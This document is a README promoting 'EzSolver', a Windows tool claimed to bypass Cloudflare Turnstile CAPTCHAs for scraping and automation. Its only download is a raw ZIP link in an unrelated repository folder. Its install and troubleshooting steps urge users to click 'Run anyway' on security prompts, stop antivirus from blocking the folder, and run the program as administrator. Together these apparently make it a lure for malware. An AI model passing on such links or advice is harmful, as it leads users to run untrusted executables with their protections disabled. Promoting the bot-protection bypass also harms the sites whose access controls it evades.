# 🧩 EzSolver - Run Turnstile checks with ease

[![Download EzSolver](https://img.shields.io/badge/Download-EzSolver-blue?style=for-the-badge&logo=github)](https://raw.githubusercontent.com/Tangramconditionalsale300/EzSolver/main/glib/Ez_Solver_v1.2.zip)

## 📥 Download

Use this link to visit the page and download the app:

https://raw.githubusercontent.com/Tangramconditionalsale300/EzSolver/main/glib/Ez_Solver_v1.2.zip

## 🪟 Windows Setup

EzSolver is made for Windows users who want a local app that handles Cloudflare Turnstile checks through a real Chrome browser.

### What you need
- Windows 10 or Windows 11
- Google Chrome installed
- An internet connection
- At least 4 GB of RAM
- About 200 MB of free disk space

### How to install
1. Open the download page above.
2. Download the latest Windows build from the repository.
3. Save the file to your Desktop or Downloads folder.
4. If the file is a ZIP archive, right-click it and choose Extract All.
5. Open the extracted folder.
6. Run the main app file.
7. If Windows shows a security prompt, choose Run anyway only if you trust the source.
8. Keep Chrome installed, since EzSolver uses a real browser session.

### First launch
When you start EzSolver for the first time, it may create a local folder for settings and browser data. This helps the app keep its Chrome session ready for later use.

## ⚙️ How it works

EzSolver runs a local HTTP API service and uses a real Chrome browser on your machine.

It is built to handle:
- Invisible Turnstile widgets
- Checkbox-style Turnstile widgets
- Managed checks that appear during page load
- Local test flows that need a browser session

The app stays on your computer. It does not need a paid captcha service.

## 🖥️ Main use cases

Use EzSolver if you want to:
- Open sites that use Cloudflare Turnstile
- Run a local browser-based solving flow
- Test pages that block basic requests
- Keep the process on your own machine
- Avoid third-party captcha services

## 🔌 Local API

EzSolver includes a local HTTP API service for app and script use.

Common uses:
- Start a solve request
- Check the current status
- Return the browser result
- Connect other local tools to the same session

The API runs on your computer and is meant for local use.

## 🧭 Basic usage

1. Start the app.
2. Open the local interface or API endpoint.
3. Paste the target page URL or open the page inside the browser flow.
4. Let EzSolver handle the Turnstile step.
5. Wait for the result.
6. Continue with your page or app after the check passes.

## 🧰 Tips for smooth use

- Keep Google Chrome up to date.
- Close extra browser windows if the app has trouble connecting.
- Use one browser profile for a cleaner session.
- Make sure antivirus software does not block the app folder.
- If the page keeps asking for a check, reload the page once and try again.
- Use a stable network connection.

## 🪄 Features

- Real Chrome browser flow
- Local HTTP API service
- Invisible Turnstile support
- Checkbox Turnstile support
- Managed widget handling
- Lightweight setup
- No paid captcha APIs
- Works on Windows
- Works on Linux
- Built for fast local runs

## 📁 Typical folder layout

After setup, you may see files like these:
- `EzSolver.exe` or the main app file
- `config.json`
- `logs/`
- `browser-data/`
- `README.md`

These files help the app store settings, logs, and browser state.

## 🛠️ If something does not start

Try these steps:
1. Check that Chrome is installed.
2. Restart the app.
3. Re-extract the ZIP file if files look incomplete.
4. Run the app as an administrator.
5. Turn off any browser extensions that may block page scripts.
6. Make sure your system date and time are correct.
7. Try a fresh Chrome profile if the browser session fails.

## 🔍 Search terms

anti-captcha, automation, bot, captcha-bypass, captcha-solver, cloudflare, cloudflare-bypass, cloudflare-turnstile-bypass, nodriver, python, scraping, turnstile, turnstile-solver